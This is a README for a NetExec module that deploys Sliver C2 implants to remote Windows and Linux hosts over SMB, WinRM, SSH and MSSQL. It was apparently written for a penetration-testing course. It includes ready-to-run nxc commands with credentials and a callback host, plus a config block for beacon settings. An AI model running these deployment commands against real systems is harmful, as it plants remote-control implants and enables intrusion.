# Sliver NetExec Module

[![](https://github.com/moerketh/sliver-netexec-module/actions/workflows/test.yml/badge.svg?branch=main)](https://github.com/moerketh/sliver-netexec-module/actions/workflows/test.yml)

A NetExec module that deploys Sliver C2 implants to remote Windows and Linux targets via SMB, WinRM, SSH, and MSSQL protocols.

## Features

- **Multi-Protocol Support**: SMB, WinRM, SSH, MSSQL
- **Automatic OS/Architecture Detection**: Detects from connection metadata
- **Unique Implants**: Generates unique implant per target
- **Configurable Options**: Beacon intervals, cleanup, wait times, staging methods
- **Profile Support**: Use pre-configured Sliver profiles for consistent deployments
- **Cross-Platform**: Deploy to Windows and Linux targets

## Requirements

- NetExec (nxc) installed
- Sliver C2 server running (v1.6+)
- Valid Sliver client configuration
- Target credentials (Windows: admin, Linux: root/sudo, MSSQL: sysadmin)

## Quick Install

```bash
./scripts/install.sh
```

For detailed installation instructions, see [Installation Guide](docs/INSTALLATION.md).

## Quick Start

Deploy a Sliver implant via SMB:

```bash
nxc smb 172.16.15.20 -u localuser -p password \
  -M sliver_exec \
  -o RHOST=10.10.15.193
```

![](./assets/example.svg)

See [Usage Guide](docs/USAGE.md) for more examples and options.

## Configuration

You can set default values in `~/.nxc/nxc.conf` to avoid repeating options:

```ini
[Sliver]
config_path = ~/.sliver-client/configs/default.cfg
rhost = 10.10.10.10
rport = 443
beacon_interval = 5
beacon_jitter = 3
wait = 90
cleanup_mode = always
```

With config set, you can run without `-o` options:

```bash
nxc smb 172.16.15.20 -u localuser -p password -M sliver_exec
```

Module options (`-o KEY=value`) always override config file values.

## Documentation

- **[Installation Guide](docs/INSTALLATION.md)** - Setup instructions for all platforms
- **[Usage Guide](docs/USAGE.md)** - Comprehensive examples and configuration options
- **[Architecture](docs/ARCHITECTURE.md)** - Technical details and deployment modes
- **[Testing Guide](docs/TESTING.md)** - Unit, E2E, and integration tests

## Credits

This module was written as part of the **Active Directory Penetration Expert Course** on Hack The Box.

Developed with assistance from AI coding assistants: Claude (Anthropic) and Grok (xAI).
